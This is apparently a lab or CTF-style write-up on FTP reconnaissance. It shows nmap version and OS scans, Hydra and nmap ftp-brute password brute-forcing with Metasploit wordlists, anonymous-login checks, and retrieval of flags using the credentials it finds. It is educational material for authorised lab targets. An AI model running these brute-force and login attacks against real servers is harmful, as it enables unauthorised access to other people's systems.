# FTP (File Transfer Protocol)

# FTP Server Reconnaissance Basics: A Step-by-Step Guide

This guide provides various commands to FTP reconnaisance basics.

### 1. Ping Command

Checks if the target system is reachable:
`ping [target IP]`

### 2. Nmap Command

Performs a network scan to identify open ports and services:
`nmap [target IP]`

### 3. Detailed Nmap Scan

Scans the FTP port (port 21) and identifies the software and operating system:
`nmap [target IP] -p 21 -sV -O`
_Port 21 = default FTP port. Port runs ProFTP 1.3.5a, OS = Linux 2.6.32_

### 4. FTP Client
### To get the admin flag, we go through following commands:
Connects to the FTP server of the target system:
`ftp [target IP]`

### 5. Hydra Command

Performs a brute-force attack to crack username and password:
`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt [target IP] ftp`
_Tries usernames and common passwords._

### 6. FTP Login and File Download

Logs in with the found credentials and downloads a file:
`ftp [target IP], sysadmin, 654321`
After login:
`ls`
`get secret.txt`

### 7. List Directory Contents

Displays the contents of the current directory:
`ls`

### 8. Display File Contents

Displays the contents of the downloaded file:
`cat secret.txt`

### 9. Nmap Brute-Force Script

Creates a file with the username and performs a brute-force attack with nmap:
`echo "sysadmin" > users`
`cat users`
`nmap [target IP] --script ftp-brute --script-args userdb=/root/users -p 21`


Questions

    1. What is the version of FTP server?
    2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/        unix_passwords.txt       to check if any of these credentials work on the system. List all found credentials.
    3. Find the password of user “sysadmin” using nmap script.
    4. Find seven flags hidden on the server.


1. We run the following command to get info about the OS and services:
` nmap 192.132.3.3 -p 21 -sV`
**ProFTPD 1.3.5a**
2. We want to brute-force usernames and passwords using the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt    and the password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt. After that we wanna check if they work on our FTP service:
`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.132.3.3 ftp`
**We can login with all the credentials using following command:**
`ftp [target IP]`
3. To try bruteforcing with nmap, we use following command:
`nmap 192.132.3.3 --script ftp-brute --script-args userdb=/root/users -p 21`
**sysadmin:654321 - Valid credentials**
![grafik](https://github.com/user-attachments/assets/80eb1d5b-9dfb-4215-9e2d-64d79919259e)

### FTP Login

`ip a`
`ping [target IP]`
`nmap [target IP]`: port 21 open
`nmap [target IP] -p 21 -sV`: version: vsftpd 
`nmap [target IP] -p 21 --script ftp-anon`: Anonymous FTP login is allowed
`ftp [target IP]`: anonymous, password: none
`ls`
    ftp:`get flag`
    ftp: `bye`
`cat flag`



1. Find the version of vsftpd server.
2. Check whether anonymous login is allowed on the ftp server using nmap script.
3. Fetch the flag from FTP server.

We want to find out the version of the vsftpd server:
`nmap 192.158.73.3 -p 21 -sV`
**vsftpd 3.0.3**

After that we want to check if anonymous login is allowed on the ftp server using following nmap script:
`nmap 192.158.73.3 -p 21 --script ftp-anon`
**Anonymous login allowed**

So we login:
`ftp login`
and we get the flag.




